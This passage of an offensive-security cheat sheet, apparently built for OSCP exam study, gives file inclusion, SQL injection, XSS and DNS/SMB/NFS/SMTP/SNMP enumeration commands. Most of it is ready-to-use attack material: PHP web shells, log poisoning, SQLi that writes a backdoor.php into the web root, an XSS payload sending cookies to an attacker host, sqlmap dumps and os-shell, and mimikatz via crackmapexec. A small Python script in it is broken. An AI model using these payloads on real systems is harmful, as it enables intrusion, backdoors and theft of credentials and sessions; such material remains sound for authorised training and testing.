        ruby -run -e httpd . -p 9000
        ```

        <br></br>
        <b>Busybox</b>

        ```
        busybox httpd -f -p 10000
        ```

        <br></br>
    </details>

    <details>
    <summary>File Inclusion/Directory Traversal</summary>

    + <details>
        <summary>LFI/Directory Traversal</summary>

        + 
            <br></br>
            <b>Testing for LFI</b>

            ```
            http://example.com/index.php?page=etc/passwd
            ```
            ```
            http://example.com/index.php?page=etc/passwd
            ```
            ```
            http://example.com/index.php?page=../../etc/passwd
            ```
            ```
            http://example.com/index.php?page=%2e%2e%2f
            ```
            ```
            http://example.com/index.php?page=....//....//etc/passwd
            ```
            ```
            http://example.com/index.php?page=c:\windows\system32\drivers\etc\hosts
            ```

            <li><b>page=</b>&ensp;--&ensp;page=, file= etc: are good indications that directory traversal is possible: Usually not this obvious</li>
            <li><b>Tip:</b>&ensp;--&ensp;change file to something that doesn't exist and check errormessage for any clues to current path.</li>
            <br></br>

            <b>More Info</b>

            ```
            https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf
            ```

            <br></br>
            <b>Interesting Linux Files</b>

            ```
            /etc/passwd
            ```
            ```
            /etc/shadow
            ```
            ```
            /etc/issue
            ```
            ```
            /etc/group
            ```
            ```
            /etc/hostname
            ```
            ```
            /etc/ssh/ssh_config
            ```
            ```
            /etc/ssh/sshd_config
            ```
            ```
            /root/.ssh/id_rsa
            ```
            ```
            /root/.ssh/authorized_keys
            ```
            ```
            /home/user/.ssh/authorized_keys
            ```
            ```
            /home/user/.ssh/id_rsa
            ```

            <br></br>
            <b>Interesting Windows Files</b>

            ```
            /boot.ini
            ```
            ```
            /autoexec.bat
            ```
            ```
            /windows/system32/drivers/etc/hosts
            ```
            ```
            /windows/repair/SAM
            ```

            <br></br>
        </details>

        <details>
        <summary>RFI</summary>

        + 
            <br></br>
            <b>Testing for RFI</b>

            ```
            http://x.x.x.x/index.php?page=http://x.x.x.x/shell.txt
            ```
            ```
            http://x.x.x.x/index.php?page=http:%2f%2fx.x.x.x%2fshell.txt
            ```

            <br></br>
            <b>Attack Machine Setup WebShell</b>

            ```
            cat /var/www/html
            ```
            echo "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>" > shell.txt
            ```
            sudo systemctl start apache2
            ```

        </details>

        <details>
        <summary>Log File Contamination</summary>

        + 
            <br></br>
            <b>Inserting Code into Log Files</b>

            ```
            nc -nv x.x.x.x 80
            ```
            ```
            <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
            ```

            <li><b>php</b>&ensp;--&ensp;Code written in php</li>
            <li><b>echo</b>&ensp;--&ensp;Prints output to page</li>
            <li><b>pre</b>&ensp;--&ensp;Preserves any line breaks and formating</li>
            <li><b>shell_exec()</b>&ensp;--&ensp;Executes OS command</li>
            <li><b>$_GET['cmd']</b>&ensp;--&ensp;OS command is retrieved from cmd</li>
            <br></br>

            <b>Executing Webshell within Log file</b>

            ```
            http://x.x.x.x/index.php?page=c:\xampp\apache\logs\access.log&cmd=ipconfig
            ```

            <br></br>
        </details>

        <details>
        <summary>PHP Wrappers</summary>

        + 
            <br></br>
            <b>Basic</b>

            ```
            http://x.x.x.x/menu.php?file=data:text/plain,hello world
            ```

            <li><b>data:</b>&ensp;--&ensp;Treats Command as a File</li>
            <li><b>text/plain,</b>&ensp;--&ensp;Use Plain Text to send the following</li>

            <br></br>
            <b>Run Commands from PHP Wrapper</b>

            ```
            http://x.x.x.x/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
            ```

            <br></br>
        </details>
    </details>

    <details>
    <summary>SQL Injection</summary>

    + <details>
        <summary>SQL Map (Not Allowed on OSCP)</summary>

        + 
            <b>Enumerate Webserver/DBMS Version</b>
            
            ```
            sqlmap -u http://x.x.x.x/search.php?id=1' -p id --technique=U
            ```
            
            <br></br>
            <b>Banner Grab</b>
            
            ```
            sqlmap -u http://x.x.x.x/search.php?id=1' -p id --technique=U --banner
            ```
            
            <br></br>
            <b>Enumerate Payloads</b>
            
            ```
            sqlmap -u http://x.x.x.x/search.php?id=1' -p id --technique=U --banner -v3 --fresh-queries
            ```
            
            <br></br>
            <b>Enumerate Users</b>
            
            ```
            sqlmap -u http://x.x.x.x/search.php?id=1' -p id --technique=U --users
            ```
            
            <br></br>
            <b>List Databases</b>

            ```
            sqlmap -u http://x.x.x.x/search.php?id=1' -p id --technique=U --dbs
            ```
            
            <br></br>
            <b>Lists Tables in Database</b>
            
            ```
            sqlmap -u http://x.x.x.x/search.php?id=1' -p id --technique=U -D <DatabaseName> --tables
            ```
            
            <br></br>
            <b>Lists Columns of User Table</b>
            
            ```
            sqlmap -u http://x.x.x.x/search.php?id=1' -p id --technique=U -D <DatabaseName> -T <TableName> --columns
            ```
            
            <br></br>
            <b>Dump Columns</b>
            
            ```
            sqlmap -u http://x.x.x.x/search.php?id=1' -p id --technique=U -D <DatabaseName> -T <TableName> -C <ColumnNames> --dump
            ```
             ```
            sqlmap -u http://x.x.x.x --dbms=mysql --dump
            ```
            
            
            <br></br>
            <b>SQLMap Full Example:</b>

            ```
            sqlmap -u http://x.x.x.x/login.php --data='user=a&pass=a' -p user --technique=B --banner
            ```
            ```
            sqlmap -u http://x.x.x.x/login.php --data='user=a&pass=a' -p user --technique=B --dbs
            ```
            ```
            sqlmap -u http://x.x.x.x/login.php --data='user=a&pass=a' -p user --technique=B --D blogdb --tables
            ```
            ```
            sqlmap -u http://x.x.x.x/newsdetails.php?id=1 -D awd -T accounts --dump  
            ```
            
            <br></br>
            <b>Sqlmap shell</b>

            ```
            sqlmap -u http://x.x.x.x --dbms=mysql --os-shell
            ```
            
            <br></br>
            <b>Sqlmap Crawl</b>

            ```
            sqlmap -u http://x.x.x.x --crawl=1
            ```

            <br></br>
        </details>

        <details>
        <summary>SQLi</summary>

        + 
            <b>Initial Test</b>
            
            ```
            '
            ```
            ```
            "
            ```
            
            <br></br>
            <b>Always True Statements</b>
            
            ```
            ' or 1=1#
            ```
            ```
            ' or 1=1;#
            ```
            ```
            ' or 1=1 --
            ```
            ```
            ' or 1=1 -- -
            ```
            
            <br></br>
            <b>Error for payload having multiple rows? Try This.</b>

            ```
            ' or 1=1 LIMIT 1 --
            ```
            ```
            ' or 1=1 LIMIT 1 -- -
            ```
            ```
            ' or 1=1 LIMIT 1#
            ```
            ```
            ' or 1=1 LIMIT 1;#
            ```
            
            
            <br></br>
            <b>Column Number Enumeration </b>BurpSuite Repeater Can help with this process by searching for "error" 
          
            ```
            ′ UNION SELECT 1′; — – 
            ```
            ```
            ′ UNION SELECT 1,2; — –
            ```
            ```
            ′ UNION SELECT 1,2,3; — – 
            ```
            ```
            order by 1
            ```
            ```
            order by 2
            ```
            ```
            order by 3
            ```
         
            <br></br>
            <b>Testing for a Row</b>
            
            ```
            union all select 1,2,3,4,5,6,7,8
            ```
            ```
            union all select id,username,password,4,5 FROM users
            ```
            
            <br></br>
            <b>Variable Names</b>
            
            ```
            @@hostname
            ```
            ```
            @@tmpdir
            ```
            ```
            @@datadir
            ```
            ```
            @@version
            ```
            ```
            @@basedir
            ```
            ```
            user()
            ```
            ```
            database()
            ```
            ```
            version()
            ```
            ```
            schema()
            ```
            ```
            UUID()
            ```
            ```
            current_user()
            ```
            ```
            current_user
            ```
            ```
            system_user()
            ```
            ```
            session_user()
            ```
            ```
            Session user
            ```
            ```
            @@GLOBAL.have_symlink
            ```
            ```
            @GLOBAL.have_ssl
            ```
            ```
            table_name
            ```
            
            <br></br>
            <b>MariaDB</b>
            
            ```
            union all select 1,2, @@version
            ```
            ```
            union all select 1,2, user()
            ```
            ```
            union all select 1,2,table_name from information_schema.tables
            ```
            ```
            union all select 1,2, column_name from information_schema.columns where table_name='<TableName>'
            ```
            ```
            union all select 1,<ColumnName>,<ColumnName> from <TableName> 
            ```
            
            <b>Real Example</b>
            
            ```
            1' UNION ALL SELECT NULL,NULL,group_concat(schema_name),NULL,NULL,NULL,NULL FROM information_schema.schemata-- -
            ```
            ```
            1' UNION ALL SELECT NULL,NULL,group_concat(table_name),NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema= "<SchemaName>"-- -
            ```
            ```
            1' UNION ALL SELECT NULL,NULL,group_concat(table_name),NULL,NULL,NULL,NULL FROM information_schema.tables-- -
            ```
            ```
            1' UNION ALL SELECT NULL,NULL,group_concat(column_name),NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_schema= "<SchemaName>" AND table_name= "<TableName>"-- -
            ```
            ```
            1' UNION ALL SELECT NULL,NULL,group_concat(column_name),NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name= "<TableName>"-- -
            ```
            ```
            1' UNION ALL SELECT NULL,NULL,group_concat(<ColumnName>),NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_schema= "<SchemaName>" AND table_name= "<TableName>"-- -
            ```
            ```
            1' UNION ALL SELECT NULL,NULL,group_concat(<Column>," : " ,<Column>),NULL,NULL,NULL,NULL FROM <SchemaName>.<TableName>-- -
            ```
            
            
            <br></br>
            <b>Code Execution: Windows: Can we read a File?</b>
            
            ```
            union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
            ```
            
            <br></br>
            <b>Code Execution: Windows: Create Malicious PHP file in Web Root </b> tip: check sql error code for web root location
            ```
            union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
            ```
            ```
            /backdoor.php?cmd=ifconfig
            ```

            <br></br>
        </details> 
    </details>

    <details>
    <summary>XSS</summary>

    + 
        <br></br>
        <b>Identify XSS Vulnerabilities: Are any of these characters unfiltered: Check Source for non-filtered characters</b>

        ```
        < > ' " { } ;
        ```

        <li><b><></b>&ensp;--&ensp;HTML uses "<" and ">" to denote elements</li>
        <li><b>{}</b>&ensp;--&ensp;JavaScript uses "{" and "}" in function declaration</li>
        <li><b>' "</b>&ensp;--&ensp;Single and Double Quotes are used to denote strings</li>
        <li><b>;</b>&ensp;--&ensp;Semicolons are used to mark end of statement</li>

        <br></br>
        <b>Identify XSS Vulnerability: Basic Alert Window</b>

        ```
        <script>alert('Hello')</script>
        ```

        <br></br>
        <b>Content Injection: Invisible iframe: Stealthy alternative to Redirect</b>

        ```
        <iframe src=https://x.x.x.x/report height="0" width="0"></iframe>
        ```
        ```
        sudo nc -nvlp 80
        ```

        <li><b>height="0" width="0"</b>&ensp;--&ensp;Makes iframe invisible</li>
        <li><b></b>&ensp;--&ensp;Any user that visits webpage with be redirected to attack machine</li>
        <br></br>

        <b>Steal Cookies/Session Information</b>

        ```
        <script>new Image().src="http://x.x.x.x/cool.jpg?output="+document.cookie;</script>
        ```
        ```
        sudo nc -nvlp 80
        ```

        <br></br>

    </details>
</details>

<details>
<summary>DNS</summary>

+ <details>
    <summary>Dig</summary>

    + 
        <br></br>

        ```
        dig www.example.com + short
        ```

        <li><b>+ short</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        dig www.example.com MX
        ```

        <li><b>MX</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        dig www.example.com NS
        ```

        <li><b>NS</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        dig www.example.com SOA
        ```

        <li><b>SOA</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        dig www.example.com ANY +noall +answer
        ```

        <li><b>ANY</b>&ensp;--&ensp;</li>
        <li><b>+noall</b>&ensp;--&ensp;</li>
        <li><b>+answer</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        dig -x www.example.com
        ```

        <li><b>-x</b>&ensp;--&ensp;Simplified Reverse Lookups, for Mapping Addresses to Names</li>
        <br></br>

        ```
        dig -4 www.example.com
        ```

        <li><b>-4</b>&ensp;--&ensp;IPv4</li>
        <br></br>

        ```
        dig -6 www.example.com
        ```

        <li><b>-6</b>&ensp;--&ensp;IPv6</li>
        <br></br>

        ```
        dig www.example.com mx +noall +answer
        ```

        <li><b>mx</b>&ensp;--&ensp;</li>
        <li><b>+noall</b>&ensp;--&ensp;</li>
        <li><b>+answer</b>&ensp;--&ensp;</li>
        <li><b>ns</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        dig -t AXFR www.example.com
        ```
        <li><b>-t AXFR</b>&ensp;--&ensp;Resource Record Type to Query</li>

        <br></br>

        <b>Something</b>
        <li><b>AXFR</b>Zone Transfer</li>
        <li><b>IXFR</b>Icremental Zone Transfer</li>
        <br></br>
    </details>

    <details>
    <summary>Host</summary>

    + 
        <b>Reverse Lookups for IP to Domain Name: Add IP of the Target DNS server to resolv.conf</b>
        
        ```
        sudo vim /etc/resolv.conf
        ```
        ```
        nameserver x.x.x.x
        ```
        
        <b>Reverse Lookup with IP</b>
        
        ```
        host x.x.x.x
        ```
        
        <br></br>
        <b>Find IP Address of Hostname: Looks for A host record</b>

        ```
        host www.example.com
        ```
        <br></br>
        <b>MX Records: </b>

        ```
        host -t mx www.example.com
        ```

        <li><b>-t</b>&ensp;--&ensp;type</li>
        <li><b>mx</b>&ensp;--&ensp;Find Servers that Handle Emails for the Domain</li>

        <br></br>
        <b>Look for TXT Record</b>

        ```
        host -t txt www.example.com
        ```

        <li><b>-t</b>&ensp;--&ensp;type</li>
        <li><b>txt</b>&ensp;--&ensp;Contains any type of arbitrary data (worth investigationg)</li>

        <br></br>
        <b>Forward Lookup Brute Force</b>

        ```
        for ip in $(hostname.txt); do host $ip.example.com; done | grep -v "NXDOMAIN" | grep "has address"
        ```

        <b>Unique Domains Only</b>

        ```
        for ip in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt); do host $ip.example.com; done | grep -v NXDOMAIN | grep "has address" | cut -d " " -f 1 | uniq -c 

        ```

        <br></br>

        <b>Reverse Lookup Brute Force</b>

        ```
        for ip in $(seq 50 100); do host x.x.x.$ip; done | grep -v "not found"
        ```

        <br></br>
        <b>Look for DNS Server</b>

        ```
        host -t ns www.example.com
        ```

        <li><b>-t</b>&ensp;--&ensp;type</li>
        <li><b>ns</b>&ensp;--&ensp;DNS Servers</li>

        <br></br>
        <b>Zone Transfer</b>

        ```
        host -l example.com ns1.example.com
        ```

        <li><b>-l</b>&ensp;--&ensp;Zone Transfer</li>

        <br></br>

    </details>

    <details>
    <summary>Amass</summary>

    + 
        <br></br>

        ```
        amass enum -d www.example.com
        ```

        <li><b>enum</b>&ensp;--&ensp;</li>
        <li><b>-d</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        amass intel -whois -d www.example.com
        ```

        <li><b>intel</b>&ensp;--&ensp;</li>
        <li><b>-whois</b>&ensp;--&ensp;</li>
        <li><b>-d</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        amass intel -active x.x.x.0-64 -p 80,443,8080,8443
        ```

        <li><b>intel</b>&ensp;--&ensp;</li>
        <li><b>-active</b>&ensp;--&ensp;</li>
        <li><b>-p</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        amass intel -ipv4 -whois -d www.example.com
        ```

        <li><b>intel</b>&ensp;--&ensp;</li>
        <li><b>-ipv4</b>&ensp;--&ensp;</li>
        <li><b>-whois</b>&ensp;--&ensp;</li>
        <li><b>-d</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        amass intel -ipv6 -whois -d www.example.com
        ```

        <li><b>intel</b>&ensp;--&ensp;</li>
        <li><b>-ipv6</b>&ensp;--&ensp;</li>
        <li><b>-whois</b>&ensp;--&ensp;</li>
        <li><b>-d</b>&ensp;--&ensp;</li>
        <br></br>
    </details>

    <details>
    <summary>Sublist3r</summary>

    + 
        <br></br>

        ```
        Sublist3r -d www.example.com
        ```

        <li><b>-d</b>&ensp;--&ensp;</li>
        <br></br>

        ```
        Sublist3r -v -d www.example.com -p 80,443
        ```

        <li><b>-v</b>&ensp;--&ensp;</li>
        <li><b>-d</b>&ensp;--&ensp;</li>
        <li><b>-p</b>&ensp;--&ensp;</li>
        <br></br>
    </details>

    <details>
    <summary>DNSrecon</summary>

    + 
        <br></br>

        ```
        dnsrecon -d www.example.com -a
        ```

        <li><b>-d</b>&ensp;--&ensp;Domain Name</li>
        <li><b>-a</b>&ensp;--&ensp;Perform AXFR with standard enumeration</li>
        <br></br>

        <b>Zone Transfer</b>

        ```
        dnsrecon -d www.example.com -t axfr
        ```

        <li><b>-d</b>&ensp;--&ensp;Domain Name</li>
        <li><b>-t</b>&ensp;--&ensp;Enumeration Type</li>
        <br></br>

        ```
        dnsrecon -d

        ```

        <li><b>-d</b>&ensp;--&ensp;Domain Name</li>
        <br></br>

        <b>Brute Force Host Names</b>

        ```
        dnsrecon -d www.example.com -D <namelist> -t brt</namelist>
        ```

        <li><b>-d</b>&ensp;--&ensp;Domain Name</li>
        <li><b>-D</b>&ensp;--&ensp;Specify Domain Name File List</li>
        <li><b>-t</b>&ensp;--&ensp;Enumeration Type</li>

        <br></br>
    </details>

    <details>
    <summary>DNSenum</summary>

    + 
        <br></br>
        <b>Complete DNS Enumeration</b>

        ```
        dnsenum zonetransfer.me
        ```

        <br></br>
    </details>
</details>

<details>
<summary>SMB</summary>

+ <details>
    <summary>Enumerate SMB</summary>

    + <details>
        <summary>Enum4Linux</summary>

        + 
            <br></br>

            ```
            enum4linux -a x.x.x.x
            ```

            <li><b>-a</b>&ensp;--&ensp;Do all simple enumeration (-U -S -G -P -r -o -n -i).</li>
            <li><b>-U</b>&ensp;--&ensp;Get Userlist</li>
            <li><b>-S</b>&ensp;--&ensp;Get Sharelist</li>
            <li><b>-G</b>&ensp;--&ensp;Get Group and Member List</li>
            <li><b>-P</b>&ensp;--&ensp;Get Password Policy Information</li>
            <li><b>-r</b>&ensp;--&ensp;Enumerate Users via RID Cycling</li>
            <li><b>-o</b>&ensp;--&ensp;Get OS Information</li>
            <li><b>-n</b>&ensp;--&ensp;Do an nmblookup (Similar to NBTstat)</li>
            <li><b>-i</b>&ensp;--&ensp;Get Printer Information</li>

            <br></br>
        </details>

        <details>
        <summary>SMBmap</summary>

        + 
            <br></br>

            ```
            smbmap -H x.x.x.x -d [domain] -u [user] -p [password]
            ```
            ```
            smbmap -H x.x.x.x -d [domain] -u "" -p ""
            ```

            <li><b>-H</b>&ensp;--&ensp;Host</li>
            <li><b>-d</b>&ensp;--&ensp;Domain</li>
            <li><b>-u</b>&ensp;--&ensp;User</li>
            <li><b>-p</b>&ensp;--&ensp;Password</li>
            <br></br>
        </details>

        <details>
        <summary>Nmap</summary>

        + 
            <br></br>

            ```
            nmap --script smb-* -p 139,445 --script-args=unsafe=1 x.x.x.x
            ```
            ```
            nmap --script smb-enum-* -p 139,445 x.x.x.x
            ```

            <li><b>--script</b>&ensp;--&ensp;Run .nse script</li>
            <li><b>-p</b>&ensp;--&ensp;Port</li>
            <li><b>--script-args=unsafe=1</b>&ensp;--&ensp;Unsafe to Run</li>

            <br></br>
            <b>SMB Script List</b>

            ```
            smb2-capabilities.nse
            ```
            ```
            smb2-security-mode.nse
            ```
            ```
            smb2-time.nse
            ```
            ```
            smb2-vuln-uptime.nse
            ```
            ```
            smb-brute.nse
            ```
            ```
            smb-double-pulsar-backdoor.nse
            ```
            ```
            smb-enum-domains.nse
            ```
            ```
            smb-enum-groups.nse
            ```
            ```
            smb-enum-processes.nse
            ```
            ```
            smb-enum-services.nse
            ```
            ```
            smb-enum-sessions.nse
            ```
            ```
            smb-enum-shares.nse
            ```
            ```
            smb-enum-users.nse
            ```
            ```
            smb-flood.nse
            ```
            ```
            smb-ls.nse
            ```
            ```
            smb-mbenum.nse
            ```
            ```
            smb-os-discovery.nse
            ```
            ```
            smb-print-text.nse
            ```
            ```
            smb-protocols.nse
            ```
            ```
            smb-psexec.nse
            ```
            ```
            smb-security-mode.nse
            ```
            ```
            smb-server-stats.nse
            ```
            ```
            smb-system-info.nse
            ```
            ```
            smb-vuln-conficker.nse
            ```
            ```
            smb-vuln-cve2009-3103.nse
            ```
            ```
            smb-vuln-cve-2017-7494.nse
            ```
            ```
            smb-vuln-ms06-025.nse
            ```
            ```
            smb-vuln-ms07-029.nse
            ```
            ```
            smb-vuln-ms08-067.nse
            ```
            ```
            smb-vuln-ms10-054.nse
            ```
            ```
            smb-vuln-ms10-061.nse
            ```
            ```
            smb-vuln-ms17-010.nse
            ```
            ```
            smb-vuln-regsvc-dos.nse
            ```
            ```
            smb-vuln-webexec.nse
            ```
            ```
            smb-webexec-exploit.nse
            ```

            <br></br>
        </details>

        <details>
        <summary>SMBclient</summary>

        + 
            <br></br>

            ```
            smbclient -L x.x.x.x -N
            ```

            <li><b>-L</b>&ensp;--&ensp;This option allows you to look at what services are available on a server</li>
            <li><b>-N</b>&ensp;--&ensp;No Password</li>
            <br></br>

            ```
            smbclient //x.x.x.x/tmp -N
            ```
            
            <li><b>-N</b>&ensp;--&ensp;No Password</li>
            <br></br>
            <b>Impacket SmbClient</b>

            ```
            /usr/share/doc/python3-impacket/examples/smbclient.py username@x.x.x.x
            ```

            <br></br>
        </details>

        <details>
        <summary>RPCclient</summary>

        + 
            <br></br>

            ```
            rpcclient -U "" -N x.x.x.x enumdomusers
            ```

            <li><b>-U</b>&ensp;--&ensp;</li>
            <li><b>-N</b>&ensp;--&ensp;</li>
            <li><b>enumdomusers</b>&ensp;--&ensp;</li>
            <br></br>
        </details>

        <details>
        <summary>Impacket</summary>

        + 
            <br></br>

            ```
            python3 samdump.py SMB x.x.x.x
            ```

            <br></br>
        </details>

        <details>
        <summary>CrackMapExec</summary>

        + 
            <br></br>

            ```
            crackmapexec smb -L
            ```

            <li><b>-L</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            crackmapexec x.x.x.x -u Administrator -H [hash] --local-auth
            ```

            <li><b>-u</b>&ensp;--&ensp;User</li>
            <li><b>-H</b>&ensp;--&ensp;Hash</li>
            <li><b>--local-auth</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            crackmapexec x.x.x.x -u Administrator -H [hash] --share
            ```

            <li><b>-u</b>&ensp;--&ensp;User</li>
            <li><b>-H</b>&ensp;--&ensp;Hash</li>
            <li><b>--share</b>&ensp;--&ensp;</li>
            <br></br>

            ```
            crackmapexec smb x.x.x.0/24 -u user -p 'Password' --local-auth -M mimikatz
            ```

            <li><b>-u</b>&ensp;--&ensp;User</li>
            <li><b>-u</b>&ensp;--&ensp;Password</li>
            <li><b>--local-auth</b>&ensp;--&ensp;</li>
            <li><b>-M</b>&ensp;--&ensp;</li>
            <br></br>
        </details>
    </details>
</details>

<details>
<summary>NFS</summary>

+ <details>
    <summary>Nmap</summary>

    +
        <br></br>
        <b>Check if System is running RPCbind or Portmapper</b>

        ```
        nmap -v -p 111 x.x.x.1-254
        ```

        <li><b>-v</b>&ensp;--&ensp;Verbose</li>
        <li><b>-p</b>&ensp;--&ensp;Port #</li>
        <br></br>

        <b>Find Services that may have been registered with rpcbind</b>

        ```
        nmap -sV -p 111 --script=rpcinfo x.x.x.1-254
        ```

        <li><b>-sV</b>&ensp;--&ensp;Service Version</li>
        <li><b>-p</b>&ensp;--&ensp;Port #</li>
        <li><b>--script=</b>&ensp;--&ensp;Run Script</li>
        <br></br>

        <b>If NFS Running</b>

        ```
        nmap -p 111 --script nfs* x.x.x.x
        ```

        <li><b>-p</b>&ensp;--&ensp;Port #</li>
        <li><b>--script=</b>&ensp;--&ensp;Run Script</li>
        <br></br>

        <b>NFS Scrips</b>

        ```
        /usr/share/nmap/scripts/nfs-ls.nse
        ```
        ```
        /usr/share/nmap/scripts/nfs-showmount.nse
        ```
        ```
        /usr/share/nmap/scripts/nfs-statfs.nse
        ```

        <br></br>

        <b>Mount Directory: NFS Sharing Directory? ex: /home</b>

        ```
        mkdir home && sudo mount -o nolock x.x.x.x:/home ~/home/
        ```

        <li><b>-o nolock</b>&ensp;--&ensp;Disable File Locking, Often needed for older NFS Servers</li>
        <br></br>
</details>

<details>
<summary>SMTP</summary>

+ 
    <br></br>
    <b>Netcat into SMTP</b>

    ```
    nc -C x.x.x.x 25
    ```
    
    <b>Telnet into SMTP</b>
    
    ```
    telnet x.x.x.x 25
    ```
    <br></br>
    <b>SMTP Commands Available</b>
    
    ```
    HELP
    ```
        

    <br></br>
    <b>Commands to SMTP within Netcat Connection: Verify an Email Address</b>

    ```
    VRFY root
    ```
    <li><b>root</b>&ensp;--&ensp;Can be exchanged with any user as long as it exists</li>

    <br></br>
    <b>Commands to SMTP within Netcat Connection: Membership of Mailing List</b>

    ```
    EXPN
    ```

    <br></br>
    <b>Python Script for Automating VRFY Command on User</b>

    ```
    #!/usr/bin/python

    import socket
    import sys

    username =
    Rhost = x.x.x.x

    if len(sys.argv) != 2:
            print "Usage: vrfy.py username"
            sys.exit(0)

    # Create a Socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the Server
    connect = s.connect(('Rhost',25))

    # Receive the banner
    banner = s.recv(1024)

    print banner

    # VRFY a user
    s.send('VRFY ' + sys.argv[1] + '\r\n')
    result = s.recv(1024)

    print result

    # Close the socket
    s.close()
    ```

</details>



<details>
<summary>SNMP</summary>

+ <details>
    <summary>SNMP Walk</summary>

    + 
        <br></br>
        <b>Enumerate Entire MIB Tree</b>

        ```
        snmpwalk -c public -v1 -t 10 x.x.x.x
        ```
        ```
        snmpwalk -c private -v1 -t 10 x.x.x.x
        ```
        ```
        snmpwalk -c manager -v1 -t 10 x.x.x.x
        ```

        <li><b>-c</b>&ensp;--&ensp;Community</li>
        <li><b>-v1</b>&ensp;--&ensp;SNMP Version Number</li>
        <li><b>-t</b>&ensp;--&ensp;Increases Timeout to 10 Seconds</li>

       <br></br>
        <b>Enumerate Windows Users</b>

        ```
        snmpwalk -c public -v1 x.x.x.x 1.3.6.1.4.1.77.1.2.25
        ```
        ```
        snmpwalk -c private -v1 x.x.x.x 1.3.6.1.4.1.77.1.2.25
        ```
        ```
        snmpwalk -c manager -v1 x.x.x.x 1.3.6.1.4.1.77.1.2.25
        ```

        <li><b>-c</b>&ensp;--&ensp;Community</li>
        <li><b>-v1</b>&ensp;--&ensp;SNMP Version Number</li>

        <br></br>
        <b>Enumerate Running Windows Processes</b>

        ```
        snmpwalk -c public -v1 x.x.x.x 1.3.6.1.2.1.25.4.2.1.2
        ```
        ```
        snmpwalk -c private -v1 x.x.x.x 1.3.6.1.2.1.25.4.2.1.2
        ```
        ```
        snmpwalk -c manager -v1 x.x.x.x 1.3.6.1.2.1.25.4.2.1.2
        ```

        <li><b>-c</b>&ensp;--&ensp;Community</li>
        <li><b>-v1</b>&ensp;--&ensp;SNMP Version Number</li>

        <br></br>
        <b>Enumerate Open TCP Ports</b>

        ```
        snmpwalk -c public -v1 x.x.x.x 1.3.6.1.2.1.6.13.1.3
        ```
        ```
        snmpwalk -c private -v1 x.x.x.x 1.3.6.1.2.1.6.13.1.3
        ```
        ```
        snmpwalk -c manager -v1 x.x.x.x 1.3.6.1.2.1.6.13.1.3
        ```

        <li><b>-c</b>&ensp;--&ensp;Community</li>
        <li><b>-v1</b>&ensp;--&ensp;SNMP Version Number</li>

        <br></br>
        <b>Enumerate Installed Software</b>

        ```
        snmpwalk -c public -v1 x.x.x.x 1.3.6.1.2.1.25.6.3.1.2
        ```
        ```
        snmpwalk -c private -v1 x.x.x.x 1.3.6.1.2.1.25.6.3.1.2
        ```
        ```
        snmpwalk -c manager -v1 x.x.x.x 1.3.6.1.2.1.25.6.3.1.2
        ```

        <li><b>-c</b>&ensp;--&ensp;Community</li>
        <li><b>-v1</b>&ensp;--&ensp;SNMP Version Number</li>
    </details>

    <details>
    <summary>Nmap</summary>

    + 
        <br></br>

        ```
        nmap x.x.x.x -Pn -sU -p 161 --script=
        ```

        <li><b>-Pn</b>&ensp;--&ensp;Disable Host Discovery</li>
        <li><b>-sU</b>&ensp;--&ensp;UDP Scan</li>
        <li><b>-p</b>&ensp;--&ensp;Scan Ports Entered</li>
        <li><b>--script=</b>&ensp;--&ensp;Script Scan using the comma-separated list of filenames</li>
        <br></br>

        <br></br>
        <b>List of SNMP.nse Scripts</b>

        ```
        /usr/share/nmap/scripts/snmp-brute.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-hh3c-logins.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-info.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-interfaces.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-ios-config.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-netstat.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-processes.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-sysdescr.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-win32-services.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-win32-shares.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-win32-software.nse
        ```
        ```
        /usr/share/nmap/scripts/snmp-win32-users.nse
        ```

        <br></br>

    </details>

    <details>
    <summary>Metasploit aux Modules</summary>

    + 
        <br></br>

        ```
        auxliary/scanner/misc/oki_scanner
        ```
        ```
        auxiliary/scanner/snmp/aix_version
        ```
        ```
        auxiliary/scanner/snmp/arris_dg950
        ```
        ```
        auxiliary/scanner/snmp/brocade_enumhash
        ```
        ```
        auxiliary/scanner/snmp/cisco_config_tftp
        ```
        ```
        auxiliary/scanner/snmp/cisco_upload_file
        ```
        ```
        auxiliary/scanner/snmp/cnpilot_r_snmp_loot
        ```
        ```
        auxiliary/scanner/snmp/epmp1000_snmp_loot
        ```
        ```
        auxiliary/scanner/snmp/netopia_enum
        ```
        ```
        auxiliary/scanner/snmp/sbg6580_enum
        ```
        ```
        auxiliary/scanner/snmp/snmp_enum
        ```
        ```
        auxiliary/scanner/snmp/snmp_enum_hp_laserjet
        ```
        ```
        auxiliary/scanner/snmp/snmp_enumshares
        ```
        ```
        auxiliary/scanner/snmp/snmp_enumusers
